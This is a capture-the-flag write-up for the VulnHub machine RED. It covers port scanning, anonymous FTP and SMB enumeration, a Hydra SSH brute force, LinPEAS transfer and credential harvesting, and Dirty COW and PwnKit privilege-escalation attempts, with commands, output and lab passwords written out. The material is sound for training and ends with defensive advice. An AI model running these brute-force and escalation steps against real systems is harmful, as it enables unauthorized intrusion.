````md
# VulnHub - RED Writeup

> **Platform:** VulnHub  
> **Machine:** RED  
> **Difficulty:** Medium  
> **Operating System:** Linux  
> **Target IP:** 192.168.56.142

---

# Introduction

Today we are back with another Medium-level VulnHub machine.

This is a Linux-based machine where the objective is to perform reconnaissance, identify exposed services, obtain valid credentials, gain SSH access, enumerate the compromised system, and finally escalate privileges to root.

The attack involves several different services and vulnerabilities, including:

- Anonymous FTP
- SMB enumeration
- Information disclosure
- WordPress enumeration
- Hidden data in an image
- Credential discovery
- SSH access
- Linux privilege enumeration
- Dirty COW
- PwnKit / CVE-2021-4034

---

# Part 1 - Network Discovery

## Finding the Target IP

The first step is identifying the IP address assigned to the vulnerable virtual machine.

Since this is a local VirtualBox lab, `netdiscover` can be used to identify active hosts on the network.

```bash
netdiscover -i eth1
````

Example output:

```text
192.168.56.1      0a:00:27:00:00:00
192.168.56.100    08:00:27:2f:99:6a
192.168.111.1    0a:00:27:00:00:00
```

However, the initial result contains an IP belonging to the VM/network configuration rather than the actual target.

Therefore, the local subnet is scanned using Nmap.

```bash
sudo nmap -sn 192.168.56.0/24
```

Output:

```text
Nmap scan report for 192.168.56.1
Host is up.
MAC Address: 0A:00:27:00:00:00

Nmap scan report for 192.168.56.100
Host is up.
MAC Address: 08:00:27:2F:99:6A
Oracle VirtualBox virtual NIC

Nmap scan report for 192.168.56.142
Host is up.
MAC Address: 08:00:27:9E:D5:6D
Oracle VirtualBox virtual NIC

Nmap scan report for 192.168.56.106
Host is up.
```

The target IP is:

```text
192.168.56.142
```

---

# Full Port Scan

Now that the target has been identified, perform a full TCP port scan.

```bash
nmap -p- 192.168.56.142
```

The scan reveals several interesting services:

```text
PORT      STATE    SERVICE
20/tcp    closed   ftp-data
21/tcp    open     ftp
22/tcp    open     ssh
53/tcp    open     domain
80/tcp    open     http
123/tcp   closed   ntp
137/tcp   closed   netbios-ns
138/tcp   closed   netbios-dgm
139/tcp   open     netbios-ssn
666/tcp   open     doom
3306/tcp  open     mysql
12380/tcp open     unknown
```

There are multiple potential attack surfaces.

The most interesting ports at this stage are:

```text
21      FTP
22      SSH
53      DNS
80      HTTP
139     SMB
666     Unknown service
3306    MySQL
12380   HTTP
```

---

# Service and Version Enumeration

Next, perform service and version detection.

```bash
nmap -sC -sV -p21,22,53,80,139,666,3306,12380 192.168.56.142
```

Important results:

```text
21/tcp    open  ftp       vsftpd 2.0.8 or later
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4
53/tcp    open  domain    dnsmasq 2.75
80/tcp    open  http      PHP cli server 5.5 or later
139/tcp   open  netbios   Samba smbd 4.3.9-Ubuntu
666/tcp   open  unknown   ZIP file
3306/tcp  open  mysql     MySQL 5.7.12-0ubuntu1
12380/tcp open  http      Apache httpd 2.4.18
```

The machine identifies itself as:

```text
Host: RED
OS: Linux
```

The Samba information also reveals:

```text
Computer name: red
NetBIOS computer name: RED
Workgroup: WORKGROUP
```

The service enumeration provides several promising directions.

---

# Part 2 - FTP Enumeration

## Anonymous FTP

Port 21 is running FTP.

The Nmap scan already tells us something important:

```text
ftp-anon: Anonymous FTP login allowed
```

Therefore, anonymous FTP access should be tested.

```bash
ftp 192.168.56.142
```

The FTP server responds with a banner:

```text
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------
```

The name **Harry** immediately stands out.

This potentially gives us one valid username:

```text
Harry
```

---

# FTP Note

Inside the FTP account, another note is found:

```bash
cat note
```

Contents:

```text
Elly, make sure you update the payload information.
Leave it in your FTP account once your are done, John.
```

This gives us additional usernames:

```text
Harry
John
Elly
```

At this point, we have already discovered several potential accounts.

---

# Part 3 - SMB Enumeration

Port 139 is running Samba.

The next step is enumerating the SMB service.

A useful tool for this is:

```bash
enum4linux
```

Run:

```bash
enum4linux 192.168.56.142
```

The share enumeration reveals:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
kathy           Disk      Fred, What are we doing here?
tmp             Disk      All temporary files should be stored here
IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
```

Two shares immediately stand out:

```text
kathy
tmp
```

---

# Accessing the Kathy Share

The `kathy` share can be accessed without authentication.

```bash
smbclient \\\\192.168.56.142\\kathy -N
```

Once connected:

```text
smb: \> ls
```

Output:

```text
.                    D        0
..                   D        0
kathy_stuff          D        0
backup               D        0
```

The share contains:

```text
kathy_stuff
backup
```

These directories should be investigated further.

---

# Files Obtained from SMB

Several files are recovered from the SMB share:

```text
todo-list.txt
vsftpd.conf
wordpress-4.tar.gz
```

These files are copied to the local machine for further investigation.

---

# Investigating todo-list.txt

Read the file:

```bash
cat todo-list.txt
```

Contents:

```text
I'm making sure to backup anything important for Initech, Kathy
```

This confirms that the SMB share contains backup-related material.

---

# WordPress Backup

The archive:

```text
wordpress-4.tar.gz
```

is extracted for examination.

```bash
tar -xzf wordpress-4.tar.gz
```

The extracted WordPress directory is then inspected for:

* Credentials
* Configuration files
* Database information
* Hidden files
* Usernames
* Application secrets

The investigation does not reveal actual credentials in the WordPress source.

The main findings are:

```text
1. Placeholder values in wp-config-sample.php
2. Developer contact emails
3. Server/domain references
4. Standard WordPress code paths
```

Therefore, the WordPress backup does not immediately provide a direct credential.

---

# Part 4 - Port 666

Another unusual service is running on:

```text
666/tcp
```

Nmap identifies the service as returning ZIP data.

Connect to it:

```bash
nc -vn 192.168.56.142 666
```

The response is heavily obfuscated/binary.

However, the Nmap fingerprint gives an important clue:

```text
message2.jpg
```

The response appears to contain a ZIP archive with an image file.

The extracted image is investigated further.

---

# Hidden Information in the Image

The image contains metadata and an embedded message.

The significant finding is:

```text
"If you are reading this, you should get a cookie!"
```

The image is identified as a JPEG/JFIF file.

It also contains:

```text
Photoshop 3.0 metadata
8BIM comment block
```

This indicates that the image contains additional metadata rather than simply being a normal JPEG.

The important hidden message is:

```text
If you are reading this, you should get a cookie!
```

Although this does not directly provide a password, it confirms that the machine contains intentionally hidden information.

---

# Part 5 - Web Enumeration on Port 12380

The other HTTP service is running on:

```text
12380/tcp
```

Open:

```text
http://192.168.56.142:12380/
```

The server is identified as:

```text
Apache/2.4.18 (Ubuntu)
```

The site is then subjected to directory and file enumeration.

---

# Source Code Enumeration

The source code contains an interesting comment:

```html
<!-- A message from the head of our HR department, Zoe,
if you are looking at this, we want to hire you! -->
```

This reveals another username:

```text
Zoe
```

At this point, several potential usernames have been identified:

```text
Harry
John
Elly
Kathy
Zoe
```

There is also a Base64-encoded string present in the page source.

The Base64 content is extracted and decoded for further analysis.

---

# Username Collection

The enumeration process has now produced a growing list of usernames.

Known usernames include:

```text
Harry
John
Elly
Kathy
Zoe
```

The FTP and SMB enumeration also provide additional information that can later be used for authentication testing.

Because FTP and SSH are both exposed, credential testing can be performed against those services in the authorized lab environment.

---

# Part 6 - Credential Brute Force

The previously discovered usernames are tested against the exposed services.

FTP is tested first.

The credentials discovered for Elly are:

```text
elly:ylle
```

This confirms that some of the usernames found during enumeration correspond to actual accounts.

The FTP account is then investigated for additional useful information.

---

# Username List

A larger username list is eventually obtained from the FTP/Samba data.

The list contains usernames such as:

```text
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
elly
```

This gives us a much larger attack surface for SSH authentication testing.

---

# SSH Credential Discovery

Hydra is used against SSH with the recovered username list.

```bash
hydra -L user.txt -e nsr ssh://192.168.56.142
```

Hydra discovers valid credentials:

```text
[22][ssh] host: 192.168.56.142
login: SHayslett
password: SHayslett
```

Valid credentials:

```text
Username: SHayslett
Password: SHayslett
```

This gives us our initial SSH foothold.

---

# Part 7 - SSH Access

Connect to the machine using SSH:

```bash
ssh SHayslett@192.168.56.142
```

After authentication, we obtain a shell as:

```text
SHayslett
```

---

# Enumerating Users

The `/home` directory contains many user accounts:

```bash
ls /home
```

Output includes:

```text
AParnell
CCeaser
CJoo
DSwanger
Drew
ETollefson
Eeth
IChadwick
JBare
JKanode
JLipps
LSolum
LSolum2
MBassin
MFrei
NATHAN
RNunemaker
SHAY
SHayslett
SStroud
Sam
Taylor
elly
jamie
jess
kai
mel
peter
www
zoe
```

The large number of local accounts suggests that credential reuse and user-specific configuration files may be important.

---

# Searching for user.txt

A search for `user.txt` is performed:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

The result includes:

```text
/usr/share/doc/phpmyadmin/html/_sources/user.txt
```

However, this is documentation rather than the actual machine flag.

Reading the file:

```bash
cat /usr/share/doc/phpmyadmin/html/_sources/user.txt
```

reveals:

```text
User Guide
==========

.. toctree::
    :maxdepth: 2

    transformations
    privileges
    other
    import_export
```

Therefore, this is not the target user flag.

Further system enumeration is required.

---

# Part 8 - LinPEAS Enumeration

To perform comprehensive Linux privilege enumeration, LinPEAS is transferred to the target.

On the attacking machine, host LinPEAS using an HTTP server.

Then download it from the target:

```bash
wget http://YOUR_IP:8000/linpeas.sh
```

Example output:

```text
Connecting to 192.168.56.122:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M)
Saving to: 'linpeas.sh'

linpeas.sh 100%[==========>] 1.01M
```

Make the script executable:

```bash
chmod +x linpeas.sh
```

Run it:

```bash
./linpeas.sh
```

LinPEAS produces a large amount of useful information.

Several important findings stand out.

---

# Finding 1 - WordPress Database Credentials

LinPEAS identifies the following database configuration:

```text
/var/www/https/blogblog/wp-config.php:
define('DB_PASSWORD', 'plbkac');

define('DB_USER', 'root');
```

This gives:

```text
Database User:
root

Database Password:
plbkac
```

This is significant because it exposes credentials for the MySQL database.

---

# Finding 2 - Bash History

LinPEAS also finds interesting commands in user bash histories.

For `JKanode`:

```text
/home/JKanode/.bash_history:
sshpass -p thisimypassword ssh JKanode@localhost
```

Another command reveals:

```text
/home/JKanode/.bash_history:
sshpass -p JZQuyIN5 peter@localhost
```

Therefore, we have additional credentials to investigate:

```text
JKanode
Password: thisimypassword
```

and:

```text
peter
Password: JZQuyIN5
```

This demonstrates why checking shell histories during post-exploitation is important.

---

# Finding 3 - Writable Script

LinPEAS identifies:

```text
/etc/aliases.db
```

and reports that the following script can be written:

```text
/usr/local/sbin/cron-logrotate.sh
```

Another relevant binary is:

```text
/usr/bin/gettext.sh
```

Writable scripts executed by privileged scheduled jobs can potentially provide a privilege escalation path.

---

# Finding 4 - SUID Screen

LinPEAS identifies:

```text
-rwxr-sr-x 1 root utmp 454K Feb 7 2016 /usr/bin/screen
```

The installed version is:

```text
GNU Screen 4.5.0
```

This version is historically associated with a local privilege escalation vulnerability.

---

# Finding 5 - SUID at

Another interesting SUID binary is:

```text
-rwsr-sr-x 1 daemon daemon 50K Jan 14 2016 /usr/bin/at
```

The enumeration output also associates it with an older vulnerability.

---

# Finding 6 - Pkexec

The most interesting finding is:

```text
-rwsr-xr-x 1 root root 18K Jan 17 2016 /usr/bin/pkexec
```

LinPEAS identifies potential vulnerabilities including:

```text
CVE-2021-4034
```

This is commonly known as:

```text
PwnKit
```

The system is also running:

```text
Linux version 4.4.0-21-generic
```

At this stage there are multiple possible privilege escalation paths.

---

# Part 9 - Privilege Escalation Attempt #1: Dirty COW

The first attempted privilege escalation method is **Dirty COW**.

Dirty COW is a historical Linux kernel vulnerability involving a race condition in the copy-on-write mechanism.

The machine's kernel version is old enough to investigate this vulnerability.

The exploit is compiled:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Then executed:

```bash
./dirty
```

The exploit reports:

```text
/etc/passwd successfully backed up to /tmp/passwd.bak
```

It then asks for a new password.

The generated `/etc/passwd` entry is:

```text
toor:tor9xGft4sjAE:0:0:pwned:/root:/bin/bash
```

The UID and GID values are:

```text
0:0
```

which correspond to root.

---

# Dirty COW Result

The exploit reaches the point where the `/etc/passwd` file is modified.

However, the machine encounters an issue while attempting to complete the privilege escalation.

Another limitation is encountered because the current user does not have the required ability to compile the exploit in the expected way.

Therefore, although Dirty COW appears applicable, it is not the most reliable path on this machine.

Rather than stopping here, another privilege escalation vector is investigated.

---

# Dirty COW Python Implementation

A Python implementation of Dirty COW is also tested.

The script is obtained from:

```text
https://github.com/naval0505/Automation-Tools-for-Red-Teaming/blob/main/Exploits/Dirty-Cow.py
```

The script is executed:

```bash
python dirtycow.py
```

It displays:

```text
Running CowLauncher by dotPY!

Choose which dirty cow you want!

[0] - run_dirty_cow
[1] - run_replace_dirty_cow

type a number and hit enter to choose dirty cow:
```

Option `0` is selected.

The exploit reports:

```text
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 53128
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
```

A root shell is obtained:

```text
root@red:/tmp#
```

This demonstrates that Dirty COW can provide root-level execution in the vulnerable environment.

However, because the exploit is unreliable on this particular machine, another escalation path is investigated.

---

# Part 10 - Privilege Escalation Attempt #2

Another possibility is abusing the SUID `at` binary.

An attempt is made with:

```bash
echo /etc/shadow | at now
```

However, this does not produce the desired result.

Therefore, the investigation returns to the `pkexec` vulnerability identified earlier by LinPEAS.

---

# PwnKit / CVE-2021-4034

The machine contains:

```text
/usr/bin/pkexec
```

with the SUID bit enabled.

LinPEAS specifically identifies:

```text
Potentially vulnerable to CVE-2021-4034
```

This vulnerability is commonly known as:

```text
PwnKit
```

PwnKit affects Polkit's `pkexec` component and can allow a local unprivileged user to escalate privileges to root on vulnerable systems.

---

# Compiling PwnKit

The exploit is compiled with:

```bash
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

During the attempt, the terminal encounters an error:

```text
at: invalid option -- 's'
```

followed by the usage information for `at`.

This indicates that the command input became mixed with the previous `at` command or was otherwise malformed in the shell.

The intended compilation command remains:

```bash
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

---

# PwnKit Execution Attempt

The resulting directory contains:

```text
PwnKit
PwnKit.sh
```

An attempt is made to execute:

```bash
./PwnKit
```

However, the environment again shows command/input issues:

```text
gcc: error: PwnKit.c: No such file or directory
```

and:

```text
whoami
SHayslett
```

This particular attempt does not immediately produce the expected root shell in the recorded session.

---

# Final Result

Despite the intermediate issues encountered while testing several privilege escalation methods, the machine ultimately provides a root-level path.

The final flag is retrieved using:

```bash
cat flag.txt
```

The output contains:

```text
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~

                           .-'''''-.
                           |'-----'|
                           |-.....-|
                           |       |
                           |       |
                           |       |
          _,._             |       |
     __.o`   o`"-.         |       |
  .-O o `"-.o   O )_,._    |'-----'`
 ( o   O  o )--.-"`O   o"-.`'-----'`
  '--------'  (   o  O    o)
               `----------`

b6b545dc11b7a270f4bad23432190c75162c4a2b
```

Final flag:

```text
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

---

# Complete Attack Chain

```text
                         TARGET
                           │
                           ▼
                  Network Discovery
                           │
                           ▼
                  192.168.56.142
                           │
                           ▼
                    Full Nmap Scan
                           │
          ┌────────────────┼─────────────────┐
          │                │                 │
          ▼                ▼                 ▼
        FTP               SMB              HTTP
       Port 21           Port 139         Ports 80/12380
          │                │                 │
          ▼                ▼                 ▼
 Anonymous FTP        SMB Shares       Web Enumeration
          │                │                 │
          ▼                ▼                 ▼
   Usernames          Kathy Share        Zoe / Users
          │                │                 │
          └────────────┬───┴─────────────────┘
                       │
                       ▼
                 Credential Discovery
                       │
                       ▼
               SHayslett : SHayslett
                       │
                       ▼
                    SSH Access
                       │
                       ▼
                  SHayslett Shell
                       │
                       ▼
                   LinPEAS
                       │
          ┌────────────┼───────────────────────┐
          │            │                       │
          ▼            ▼                       ▼
      WordPress    Bash History          SUID Binaries
      DB Creds      Credentials          screen / at / pkexec
          │            │                       │
          └────────────┴──────────────┬────────┘
                                      │
                                      ▼
                             Privilege Escalation
                                      │
                         ┌────────────┴────────────┐
                         │                         │
                         ▼                         ▼
                    Dirty COW                  PwnKit
                         │                    CVE-2021-4034
                         │                         │
                         └────────────┬────────────┘
                                      │
                                      ▼
                                     ROOT
                                      │
                                      ▼
                                    FLAG
```

---

# Credentials and Information Discovered

## FTP

```text
Username: elly
Password: ylle
```

## SSH

```text
Username: SHayslett
Password: SHayslett
```

## WordPress Database

```text
DB_USER: root
DB_PASSWORD: plbkac
```

## JKanode Bash History

```text
Password: thisimypassword
```

## Peter Credential

```text
Username: peter
Password: JZQuyIN5
```

---

# Important Usernames Discovered

```text
Harry
John
Elly
Kathy
Zoe
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
NATHAN
peter
```

---

# Important Ports

| Port  | Service | Finding                 |
| ----- | ------- | ----------------------- |
| 21    | FTP     | Anonymous login allowed |
| 22    | SSH     | OpenSSH 7.2p2           |
| 53    | DNS     | dnsmasq 2.75            |
| 80    | HTTP    | PHP CLI server          |
| 139   | SMB     | Samba 4.3.9             |
| 666   | Unknown | ZIP/image data          |
| 3306  | MySQL   | MySQL 5.7.12            |
| 12380 | HTTP    | Apache 2.4.18           |

---

# Important Files Discovered

```text
todo-list.txt
vsftpd.conf
wordpress-4.tar.gz
wp-config.php
message2.jpg
/etc/aliases.db
/usr/local/sbin/cron-logrotate.sh
/home/JKanode/.bash_history
/usr/bin/screen
/usr/bin/at
/usr/bin/pkexec
```

---

# Key Findings

## 1. Anonymous FTP

Anonymous FTP access exposed information and files that helped build the username list.

---

## 2. FTP Banner Information Disclosure

The FTP banner revealed:

```text
Harry
```

This provided a potential username.

---

## 3. FTP Note Information Disclosure

The note revealed:

```text
Elly
John
```

which expanded the credential attack surface.

---

## 4. SMB Anonymous Access

The Samba service exposed shares without requiring authentication.

The `kathy` share contained:

```text
kathy_stuff
backup
```

and backup-related files.

---

## 5. Hidden Data in Image

The unusual service on port 666 returned ZIP/image data.

The extracted JPEG contained a hidden Photoshop metadata comment:

```text
If you are reading this, you should get a cookie!
```

---

## 6. Web Source Disclosure

Port 12380 exposed a webpage containing:

```text
Zoe
```

This added another username to the enumeration process.

---

## 7. Weak Credentials

The username list combined with exposed services eventually resulted in:

```text
SHayslett:SHayslett
```

This provided SSH access.

---

## 8. Credential Reuse / Password Exposure

Bash histories exposed credentials for other users:

```text
JKanode
peter
```

This demonstrates the importance of checking:

```text
~/.bash_history
```

during post-exploitation.

---

## 9. Sensitive WordPress Configuration

The WordPress configuration contained:

```text
DB_USER = root
DB_PASSWORD = plbkac
```

This is a serious configuration weakness because database credentials were stored directly inside an application configuration file.

---

## 10. Vulnerable SUID Binaries

LinPEAS identified several interesting SUID binaries:

```text
/usr/bin/screen
/usr/bin/at
/usr/bin/pkexec
```

The presence of SUID `pkexec` was particularly important because of the potential:

```text
CVE-2021-4034
```

PwnKit vulnerability.

---

# Lessons Learned

## Network Enumeration

Always begin with broad reconnaissance.

A full port scan revealed services that would have been missed by scanning only the most common ports.

```bash
nmap -p- 192.168.56.142
```

Service detection should then be performed:

```bash
nmap -sC -sV 192.168.56.142
```

---

## FTP Enumeration

When anonymous FTP is enabled, always investigate:

* Server banners
* Files
* Notes
* Configuration files
* Directory contents
* Usernames

Even seemingly harmless information can become valuable later in an attack.

---

## SMB Enumeration

Anonymous SMB shares should always be enumerated.

Useful tools include:

```text
enum4linux
smbclient
smbmap
```

In this machine, SMB exposed the `kathy` share and several useful files.

---

## Web Enumeration

Never rely only on what is visible in the browser.

Always inspect:

```text
Page source
Comments
Hidden directories
Backup files
Configuration files
Encoded strings
```

The source code on port 12380 revealed another username through an HTML comment.

---

## Credential Hunting

Credentials can appear in many locations:

```text
FTP files
Configuration files
Bash history
Backup archives
Application files
Database configuration
```

In this machine, LinPEAS exposed credentials from:

```text
wp-config.php
.bash_history
```

---

## Linux Privilege Enumeration

After obtaining a shell, immediately investigate:

```bash
id
whoami
sudo -l
uname -a
cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
```

Automated tools such as LinPEAS can then help identify additional attack paths.

---

## SUID Enumeration

SUID binaries are especially important during Linux privilege escalation.

The machine contained:

```text
/usr/bin/screen
/usr/bin/at
/usr/bin/pkexec
```

Each should be checked against the installed version and known vulnerabilities.

---

## Kernel Vulnerabilities

The machine was running:

```text
Linux 4.4.0-21-generic
```

This is an old kernel version and should immediately trigger investigation into historical local privilege escalation vulnerabilities.

Dirty COW was one such candidate.

---

## Multiple Attack Paths

One of the most important lessons from this machine is not to depend on a single exploit.

The enumeration produced several potential escalation paths:

```text
Dirty COW
SUID screen
SUID at
PwnKit / pkexec
Writable cron-related script
```

If one exploit fails because of environmental conditions, another path can be investigated.

---

# Defensive Recommendations

## FTP

Disable anonymous FTP unless it is explicitly required.

If anonymous access is necessary:

* Restrict readable files.
* Prevent sensitive file exposure.
* Monitor anonymous access.
* Remove unnecessary information from banners.

---

## SMB

Anonymous SMB access should be disabled wherever possible.

Sensitive backups should never be stored in publicly accessible shares.

Apply:

```text
Least privilege
Strong authentication
Share-level access controls
Network segmentation
```

---

## Web Applications

Remove:

* Backup archives
* Debug files
* Configuration files
* Sensitive comments
* Credentials
* Developer information

from publicly accessible web directories.

---

## Credential Security

Passwords should never be stored in:

```text
.bash_history
wp-config.php
plain-text notes
FTP files
backup archives
```

Use:

* Strong unique passwords
* Password managers
* Environment variables
* Secrets-management solutions
* Proper credential rotation

---

## SUID Security

Regularly audit SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Remove unnecessary SUID permissions and keep packages patched.

---

## Kernel Updates

The system should be updated to a supported kernel version.

Running an outdated kernel exposes the system to known local privilege escalation vulnerabilities such as historical Dirty COW vulnerabilities.

---

# Final Flag

```text
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

---

# Conclusion

This VulnHub machine demonstrates how a successful compromise can develop through multiple small information leaks rather than a single obvious vulnerability.

The assessment began with network discovery and identified:

```text
192.168.56.142
```

A full port scan revealed FTP, SSH, SMB, HTTP, MySQL, and several unusual services.

Anonymous FTP immediately provided useful information, including usernames such as:

```text
Harry
Elly
John
```

SMB enumeration then revealed the `kathy` share and several backup files.

The unusual service on port 666 returned ZIP/image data containing a JPEG with hidden Photoshop metadata. The web server on port 12380 provided another username, `Zoe`, through its source code.

Combining the discovered usernames with the available services eventually resulted in valid SSH credentials:

```text
SHayslett:SHayslett
```

This provided the initial shell.

Post-exploitation enumeration with LinPEAS uncovered several important findings, including WordPress database credentials, credentials stored in bash history, writable scripts, and vulnerable SUID binaries.

The system contained multiple potential privilege escalation paths, including Dirty COW and PwnKit.

The overall attack path can therefore be summarized as:

```text
Network Discovery
       ↓
Port Enumeration
       ↓
Anonymous FTP
       ↓
User Enumeration
       ↓
SMB Enumeration
       ↓
Information Disclosure
       ↓
Web Enumeration
       ↓
Credential Discovery
       ↓
SSH Access
       ↓
LinPEAS
       ↓
Privilege Escalation Enumeration
       ↓
Dirty COW / PwnKit Investigation
       ↓
Root
       ↓
Flag
```

## Skills Practiced

* Network Discovery
* Nmap
* FTP Enumeration
* Anonymous FTP
* SMB Enumeration
* enum4linux
* smbclient
* Web Enumeration
* Directory Fuzzing
* Source Code Analysis
* Base64 Analysis
* Metadata Analysis
* Credential Discovery
* Hydra
* SSH
* Linux Enumeration
* LinPEAS
* SUID Enumeration
* Dirty COW
* PwnKit
* CVE-2021-4034
* Linux Privilege Escalation

```
```
